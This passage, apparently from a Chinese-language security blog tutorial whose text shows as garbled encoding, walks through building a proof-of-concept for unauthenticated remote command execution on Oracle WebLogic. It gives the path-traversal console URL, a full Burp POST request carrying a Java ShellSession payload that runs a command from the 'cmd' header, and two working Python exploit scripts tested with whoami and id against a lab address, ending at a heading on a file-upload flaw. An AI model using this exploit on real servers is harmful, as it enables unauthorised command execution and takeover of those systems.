ç¼–å†™åˆ†æ</h4><p>åˆ©ç”¨ Burp æŠ“å–æœªæˆæƒè®¿é—®åå°çš„æ•°æ®è¯·æ±‚åŒ…</p><div class="highlight-wrap" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /console/images/%252E%252E%252Fconsole.portal HTTP/1.1</span><br><span class="line">Host: 192.168.148.155:7001</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: en-GB,en-US;q=0.9,en;q=0.8</span><br><span class="line">Cookie: ADMINCONSOLESESSION=qiYouAipOODZ7EX6YRB10uRorC89seTtqcXuf0nFoF3gthgLCDQ3!-1131641747</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230517171248795.png" data-caption="image-20230517171248795"><img src="/../images/poc/image-20230517171248795.png" alt="image-20230517171248795"></a></p><p>ä¿®æ”¹æ•°æ®è¯·æ±‚åŒ…ä¸º POSTï¼Œæ’å…¥æ¼æ´ Payload è§¦å‘æ¼æ´ï¼Œæ¼æ´æ•°æ®åŒ…å¦‚ä¸‹ï¼š</p><div class="highlight-wrap" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /console/images/%252E%252E%252Fconsole.portal HTTP/1.1</span><br><span class="line">Host: 192.168.148.155:7001</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: en-GB,en-US;q=0.9,en;q=0.8</span><br><span class="line">Cookie: ADMINCONSOLESESSION=qiYouAipOODZ7EX6YRB10uRorC89seTtqcXuf0nFoF3gthgLCDQ3!-1131641747</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">cmd: ls</span><br><span class="line">Content-Length: 1223</span><br><span class="line"></span><br><span class="line">_nfpb=true&amp;_pageLabel=&amp;handle=com.tangosol.coherence.mvel2.sh.ShellSession(&quot;weblogic.work.ExecuteThread executeThread = (weblogic.work.ExecuteThread) Thread.currentThread(); weblogic.work.WorkAdapter adapter = executeThread.getCurrentWork(); java.lang.reflect.Field field = adapter.getClass().getDeclaredField(&quot;connectionHandler&quot;); field.setAccessible(true); Object obj = field.get(adapter); weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl) obj.getClass().getMethod(&quot;getServletRequest&quot;).invoke(obj); String cmd = req.getHeader(&quot;cmd&quot;); String[] cmds = System.getProperty(&quot;os.name&quot;).toLowerCase().contains(&quot;window&quot;) ? new String[]&#123;&quot;cmd.exe&quot;, &quot;/c&quot;, cmd&#125; : new String[]&#123;&quot;/bin/sh&quot;, &quot;-c&quot;, cmd&#125;; if (cmd != null) &#123; String result = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter(&quot;\\A&quot;).next(); weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl) req.getClass().getMethod(&quot;getResponse&quot;).invoke(req);res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush(); res.getWriter().write(&quot;&quot;); &#125;executeThread.interrupt(); &quot;);</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230517171550932.png" data-caption="image-20230517171550932"><img src="/../images/poc/image-20230517171550932.png" alt="image-20230517171550932"></a></p><h4 id="åˆ†æå°ç»“-2"><a href="#åˆ†æå°ç»“-2" class="headerlink" title="åˆ†æå°ç»“"></a>åˆ†æå°ç»“</h4><p>æ¼æ´å¤„äºåå°çš„ POST è¯·æ±‚ï¼Œä½†ç”±äºå­˜åœ¨æœªæˆæƒè®¿é—®ï¼Œæ‰€ä»¥ç™»å½•è®¤è¯ä¸éœ€è¦ç†ä¼šï¼Œåœ¨ç¼–å†™ Poc åªéœ€å®šä¹‰å¥½è¯·æ±‚å¤´ä»¥åŠè¯·æ±‚åŒ…å†å¤„ç†è¿”å›çš„ç»“æœå³å¯</p><blockquote><p>1ã€ç³»ç»Ÿå­˜åœ¨æœªæˆæƒè®¿é—®ï¼Œç›´æ¥å‰å° GET è¯·æ±‚ï¼Œä½†ç”±äºæ¼æ´ç‚¹ä¸º POST è¯·æ±‚ï¼Œæ‰€ä»¥æ¼æ´éªŒè¯æ—¶è¦å°† GET ä¿®æ”¹ä¸º POST è¯·æ±‚ ï¼Œå¹¶å®šä¹‰å¥½è¯·æ±‚å¤´ä»¥åŠè¯·æ±‚ä½“</p><p>2ã€å½“å­˜åœ¨æ¼æ´æ—¶è¿”å›å‘½ä»¤æ‰§è¡Œçš„å“åº”</p></blockquote><h4 id="Poc-åˆæ­¥ç¼–å†™-2"><a href="#Poc-åˆæ­¥ç¼–å†™-2" class="headerlink" title="Poc åˆæ­¥ç¼–å†™"></a>Poc åˆæ­¥ç¼–å†™</h4><p>æ ¹æ®ä¸Šé¢çš„å­¦ä¹ ï¼Œæˆ‘ä»¬å·²ç»åŸºæœ¬äº†è§£ Poc ç¼–å†™çš„ç®€å•æµç¨‹äº†ï¼ŒæŒ‰è€è§„çŸ©ï¼Œå…ˆç®€å•å®ç°æ¼æ´éªŒè¯ï¼Œå†ç¾åŒ–ä»£ç </p><div class="highlight-wrap" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">@File    ï¼šdemo.py</span></span><br><span class="line"><span class="string">@IDE     ï¼šPyCharm</span></span><br><span class="line"><span class="string">@Author  ï¼šFunsiooo</span></span><br><span class="line"><span class="string">@Blog    ï¼šhttps://funsiooo.github.io</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> http.client</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¼ºåˆ¶ä½¿ç”¨ HTTP/1.0 åè®®ç‰ˆæœ¬è¿›è¡Œè¯·æ±‚ï¼Œè€Œä¸æ˜¯é»˜è®¤çš„ HTTP/1.1 ç‰ˆæœ¬,æœ‰äº›æœåŠ¡å™¨å¯èƒ½å¯¹ç‰¹å®šçš„åè®®ç‰ˆæœ¬æœ‰è¦æ±‚æˆ–é™åˆ¶,é€šè¿‡å°†åè®®ç‰ˆæœ¬è®¾ç½®ä¸º HTTP/1.0ï¼Œæˆ–è®¸ç”¨äºè¯•å›¾ç»•è¿‡ä¸€äº›ä¸ HTTP/1.1ï¼Œç›¸å…³çš„é™åˆ¶æˆ–é—®é¢˜ï¼Œå…·ä½“æ²¡æ·±ç©¶</span></span><br><span class="line">http.client.HTTPConnection._http_vsn_str = <span class="string">&#x27;HTTP/1.0&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¾ç½®æœªæˆæƒçš„åå°é“¾æ¥</span></span><br><span class="line">url = <span class="string">&quot;http://192.168.148.155:7001/console/images/%252E%252E%252Fconsole.portal&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å› ä¸ºæˆ‘ä»¬è¯·æ±‚é“¾æ¥ä¸º GET æ–¹æ³•,è¯·æ±‚å¤´æ²¡æœ‰å¤„ç† POST è¯·æ±‚ä½“çš„ headers å¤´ï¼Œè¿™è¾¹éœ€è¦è‡ªå®šä¹‰ä¸€ä¸ª headers å¤´ï¼Œç¡®ä¿èƒ½è¿›è¡Œ POST è¯·æ±‚ï¼Œä¸»è¦éœ€è¦æ·»åŠ  Content-Type ä»¥åŠå®šä¹‰å‘½ä»¤æ‰§è¡Œå‚æ•° cmd</span></span><br><span class="line">headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 &#x27;</span></span><br><span class="line">                         <span class="string">&#x27;Safari/537.36&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,&#x27;</span></span><br><span class="line">                     <span class="string">&#x27;*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;en-GB,en-US;q=0.9,en;q=0.8&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;cmd&#x27;</span>: <span class="string">&#x27;ls&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># POST è¯·æ±‚ä½“ï¼Œæ³¨æ„è¿™é‡Œå’Œä¸Šé¢çš„ POST æ•°æ®åŒ…æœ‰æ‰€ä¸ä¸€æ ·ï¼Œä¸Šé¢çš„ POST è¯·æ±‚éƒ½æ˜¯å‚æ•°åŒ–ï¼Œå‚æ•°ä¸å‚æ•°å€¼å‡éœ€è¦ä½¿ç”¨å•å¼•å·æˆ–è€…åŒå¼•å·åŒ…æ‹¬ï¼Œè¯¥è„šæœ¬æ˜¯ç›´æ¥ä½¿ç”¨&#x27;&#x27;&#x27; &#x27;&#x27;&#x27; åŒ…æ‹¬å­—ç¬¦å³å¯</span></span><br><span class="line">payload = <span class="string">&#x27;&#x27;&#x27;_nfpb=true&amp;_pageLabel=HomePage1&amp;handle=com.tangosol.coherence.mvel2.sh.ShellSession(&#x27;weblogic.work.ExecuteThread executeThread = (weblogic.work.ExecuteThread) Thread.currentThread();weblogic.work.WorkAdapter adapter = executeThread.getCurrentWork();java.lang.reflect.Field field = adapter.getClass().getDeclaredField(&quot;connectionHandler&quot;);field.setAccessible(true);Object obj = field.get(adapter);weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl) obj.getClass().getMethod(&quot;getServletRequest&quot;).invoke(obj);String cmd = req.getHeader(&quot;cmd&quot;);String[] cmds = System.getProperty(&quot;os.name&quot;).toLowerCase().contains(&quot;window&quot;) ? new String[]&#123;&quot;cmd.exe&quot;, &quot;/c&quot;, cmd&#125; : new String[]&#123;&quot;/bin/sh&quot;, &quot;-c&quot;, cmd&#125;;if (cmd != null) &#123;String result = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter(&quot;\\\A&quot;).next();weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl) req.getClass().getMethod(&quot;getResponse&quot;).invoke(req);res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();res.getWriter().write(&quot;&quot;);&#125;executeThread.interrupt();&#x27;)&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ©ç”¨ requests è¿›è¡Œ POST è¯·æ±‚</span></span><br><span class="line">res = requests.post(url, data=payload, headers=headers, verify=<span class="literal">False</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¾“å‡ºå“åº”æ–‡æœ¬</span></span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230518095506669.png" data-caption="image-20230518095506669"><img src="/../images/poc/image-20230518095506669.png" alt="image-20230518095506669"></a></p><h4 id="å®Œå–„ä»£ç -2"><a href="#å®Œå–„ä»£ç -2" class="headerlink" title="å®Œå–„ä»£ç "></a>å®Œå–„ä»£ç </h4><div class="highlight-wrap" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">@File    ï¼šdemo.py</span></span><br><span class="line"><span class="string">@IDE     ï¼šPyCharm</span></span><br><span class="line"><span class="string">@Author  ï¼šFunsiooo</span></span><br><span class="line"><span class="string">@Blog    ï¼šhttps://funsiooo.github.io</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> http.client</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¼ºåˆ¶ä½¿ç”¨ HTTP/1.0 åè®®ç‰ˆæœ¬è¿›è¡Œè¯·æ±‚ï¼Œè€Œä¸æ˜¯é»˜è®¤çš„ HTTP/1.1 ç‰ˆæœ¬,æœ‰äº›æœåŠ¡å™¨å¯èƒ½å¯¹ç‰¹å®šçš„åè®®ç‰ˆæœ¬æœ‰è¦æ±‚æˆ–é™åˆ¶,é€šè¿‡å°†åè®®ç‰ˆæœ¬è®¾ç½®ä¸º HTTP/1.0ï¼Œæˆ–è®¸ç”¨äºè¯•å›¾ç»•è¿‡ä¸€äº›ä¸ HTTP/1.1</span></span><br><span class="line"><span class="comment"># ç›¸å…³çš„é™åˆ¶æˆ–é—®é¢˜ï¼Œå…·ä½“æ²¡æ·±ç©¶</span></span><br><span class="line">http.client.HTTPConnection._http_vsn_str = <span class="string">&#x27;HTTP/1.0&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿™é‡Œå’Œä¸Šé¢ä¸€æ ·ï¼Œåˆ©ç”¨ argsparse åº“å°†è¦è¾“å…¥çš„ç›®å½•å‚æ•°åŒ–ï¼Œç„¶åä½¿ç”¨ argumet() å‡½æ•°è¿›è¡Œæ¨¡å—åŒ–</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">argument</span>():</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&quot;usageï¼špython3 demo.py -u [url] -c [command]&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-u&#x27;</span>, <span class="string">&#x27;--url&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, metavar=<span class="string">&#x27;&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;[*] Please assign vulnerable url&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-c&#x27;</span>, <span class="string">&#x27;--cmd&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, metavar=<span class="string">&#x27;&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;[*] Please assign command&#x27;</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># è¿”å› args ï¼Œè¿™ä¸€æ­¥è‹¥æ²¡æœ‰ï¼Œåœ¨ä¸‹é¢çš„ Poc() å‡½æ•°ä»£ç å¤„å°±æ— æ³•è¿›è¡Œå¼•ç”¨</span></span><br><span class="line">    <span class="keyword">return</span> args</span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¾ç½® bannerï¼Œç¾åŒ–è¾“å‡º</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">banner</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">  _______      ________    ___   ___ ___   ___        __ _  _   ___   ___ ___  </span></span><br><span class="line"><span class="string"> / ____\ \    / /  ____|  |__ \ / _ \__ \ / _ \      /_ | || | / _ \ / _ \__ \ </span></span><br><span class="line"><span class="string">| |     \ \  / /| |__ ______ ) | | | | ) | | | |______| | || || (_) | (_) | ) |</span></span><br><span class="line"><span class="string">| |      \ \/ / |  __|______/ /| | | |/ /| | | |______| |__   _&gt; _ &lt; &gt; _ &lt; / / </span></span><br><span class="line"><span class="string">| |____   \  /  | |____    / /_| |_| / /_| |_| |      | |  | || (_) | (_) / /_ </span></span><br><span class="line"><span class="string"> \_____|   \/   |______|  |____|\___/____|\___/       |_|  |_| \___/ \___/____|                                                                             </span></span><br><span class="line"><span class="string">     &quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å®šä¹‰ä¸€ä¸ª Poc() å‡½æ•°æ¨¡å—åŒ–ä»£ç ï¼Œç”¨äºå¤„ç†å®šä¹‰å¥½çš„æ¼æ´éªŒè¯ä»£ç </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Poc</span>():</span><br><span class="line">     <span class="comment"># æ­¤æ¨¡å—æ˜¯è°ƒç”¨ä¸Šé¢ def argument()ï¼Œæ¨¡å—ä¹‹é—´ç›´æ¥è°ƒç”¨ï¼Œå°† argument() å‡½æ•°èµ‹å€¼ç»™ argsï¼Œç„¶å url è¢« args.url å®šä¹‰ç”¨äºå‚æ•°åŒ–è¾“å…¥ï¼Œæœ€ç»ˆ url è¢« request.post è°ƒç”¨ï¼Œcmd è¢«headers çš„ cmd è°ƒç”¨</span></span><br><span class="line">    args = argument()</span><br><span class="line">    url = args.url</span><br><span class="line">    cmd = args.cmd</span><br><span class="line"></span><br><span class="line">    <span class="comment"># å®šä¹‰æœªæˆæƒè®¿é—®çš„åå°è·¯å¾„èµ‹å€¼ç»™ path</span></span><br><span class="line">    path = <span class="string">&quot;/console/images/%252E%252E%252Fconsole.portal&quot;</span></span><br><span class="line">   </span><br><span class="line"><span class="comment"># å› ä¸ºæˆ‘ä»¬è¯·æ±‚é“¾æ¥ä¸º GET æ–¹æ³•,è¯·æ±‚å¤´æ²¡æœ‰å¤„ç† POST è¯·æ±‚ä½“çš„ headers å¤´ï¼Œè¿™è¾¹éœ€è¦è‡ªå®šä¹‰ä¸€ä¸ª headers å¤´ï¼Œç¡®ä¿èƒ½è¿›è¡Œ POST è¯·æ±‚ï¼Œä¸»è¦éœ€è¦æ·»åŠ  Content-Type ä»¥åŠå®šä¹‰å‘½ä»¤æ‰§è¡Œå‚æ•° cmd</span></span><br><span class="line">    headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 &#x27;</span></span><br><span class="line">                             <span class="string">&#x27;Safari/537.36&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,&#x27;</span></span><br><span class="line">                         <span class="string">&#x27;*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;en-GB,en-US;q=0.9,en;q=0.8&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;cmd&#x27;</span>: cmd</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># POST è¯·æ±‚ä½“ï¼Œæ³¨æ„è¿™é‡Œå’Œä¸Šé¢çš„ POST æ•°æ®åŒ…æœ‰æ‰€ä¸ä¸€æ ·ï¼Œä¸Šé¢çš„ POST è¯·æ±‚éƒ½æ˜¯å‚æ•°åŒ–ï¼Œå‚æ•°ä¸å‚æ•°å€¼å‡éœ€è¦ä½¿ç”¨å•å¼•å·æˆ–è€…åŒå¼•å·åŒ…æ‹¬ï¼Œè¯¥è„šæœ¬æ˜¯ç›´æ¥ä½¿ç”¨&#x27;&#x27;&#x27; &#x27;&#x27;&#x27; åŒ…æ‹¬å­—ç¬¦å³å¯</span></span><br><span class="line">    payload = <span class="string">&#x27;&#x27;&#x27;_nfpb=true&amp;_pageLabel=HomePage1&amp;handle=com.tangosol.coherence.mvel2.sh.ShellSession(&#x27;weblogic.work.ExecuteThread executeThread = (weblogic.work.ExecuteThread) Thread.currentThread();weblogic.work.WorkAdapter adapter = executeThread.getCurrentWork();java.lang.reflect.Field field = adapter.getClass().getDeclaredField(&quot;connectionHandler&quot;);field.setAccessible(true);Object obj = field.get(adapter);weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl) obj.getClass().getMethod(&quot;getServletRequest&quot;).invoke(obj);String cmd = req.getHeader(&quot;cmd&quot;);String[] cmds = System.getProperty(&quot;os.name&quot;).toLowerCase().contains(&quot;window&quot;) ? new String[]&#123;&quot;cmd.exe&quot;, &quot;/c&quot;, cmd&#125; : new String[]&#123;&quot;/bin/sh&quot;, &quot;-c&quot;, cmd&#125;;if (cmd != null) &#123;String result = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter(&quot;\\\A&quot;).next();weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl) req.getClass().getMethod(&quot;getResponse&quot;).invoke(req);res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();res.getWriter().write(&quot;&quot;);&#125;executeThread.interrupt();&#x27;)&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># åˆ©ç”¨ requests è¿›è¡Œ POST è¯·æ±‚</span></span><br><span class="line">        res = requests.post(url= url+ path, data=payload, headers=headers, verify=<span class="literal">False</span>, allow_redirects=<span class="literal">False</span>,</span><br><span class="line">                            timeout=<span class="number">10</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] Command results are as follows: &quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(res.text)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] Please Check your url and cmdï¼&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¸»å‡½æ•°æ‰§è¡Œä»£ç </span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    banner()</span><br><span class="line">    Poc()</span><br></pre></td></tr></table></figure></div><p>è„šæœ¬æ­£å¸¸æ‰§è¡Œï¼Œå¹¶è¿”å›çš„æ¼æ´éªŒè¯è¯·æ±‚çš„å“åº” </p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 demo.py -u http://192.168.148.155:7001/ -c whoami</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230518104816398.png" data-caption="image-20230518104816398"><img src="/../images/poc/image-20230518104816398.png" alt="image-20230518104816398"></a></p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 demo.py -u http://192.168.148.155:7001/ -c id</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230518104846087.png" data-caption="image-20230518104846087"><img src="/../images/poc/image-20230518104846087.png" alt="image-20230518104846087"></a></p><p>è„šæœ¬æ‰§è¡Œè¯·æ±‚å¼‚å¸¸åæ‰€è¿”å›çš„å“åº”</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 demo.py -u http://192.168.148.155:700 -c id</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230518104913314.png" data-caption="image-20230518104913314"><img src="/../images/poc/image-20230518104913314.png" alt="image-20230518104913314"></a></p><p>é—®é¢˜è®°å½•ï¼Œåœ¨ burp æ”¾åŒ…ä¸­ï¼ŒPoc ä»£ç ç¨æœ‰å·®å¼‚ï¼ŒåŒæ–œæ  burp ä¸­èƒ½æ‰§è¡Œï¼Œpython ä¸­ä¸èƒ½æ‰§è¡Œï¼›ä¸‰æ–œæ  python èƒ½æ‰§è¡Œ burp ä¸èƒ½æ‰§è¡Œï¼Œè„šæœ¬ç¼–å†™æ—¶ç¨å¾®æ³¨æ„ä¸€ä¸‹å³å¯</p><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230517213620411.png" data-caption="image-20230517213620411"><img src="/../images/poc/image-20230517213620411.png" alt="image-20230517213620411"></a></p><p><a data-fancybox="gallery" data-src="/../images/poc/image-20230517213700827.png" data-caption="image-20230517213700827"><img src="/../images/poc/image-20230517213700827.png" alt="image-20230517213700827"></a></p><h2 id="äº”ã€ä»»æ„æ–‡ä»¶ä¸Šä¼ "><a href="#äº”ã€ä»»æ„æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="äº”ã€ä»»æ„æ–‡ä»¶ä¸Šä¼ "></a>äº”ã€ä»»æ„æ–‡ä»¶ä¸Šä¼ </h2><h3 id="Weblogic-ä»»æ„æ–‡ä»¶ä¸Šä¼ ï¼ˆCVE-2018-2894ï¼‰"><a href="#Weblogic-ä»»æ„æ–‡ä»¶ä¸Šä¼ ï¼ˆCVE-2018-2894ï¼‰" class="headerlink" title="Weblogic ä»»æ„æ–‡ä»¶ä¸Šä¼ ï¼ˆCVE-2018-2894ï¼‰"></a>Weblogic ä»»æ„æ–‡ä»¶ä¸Šä¼ ï¼ˆCVE-2018-2894ï¼‰</h3><h4 id="ç¯å¢ƒæ­å»º-3"><a href="#ç¯å¢ƒæ­å»º-3" class="headerlink" 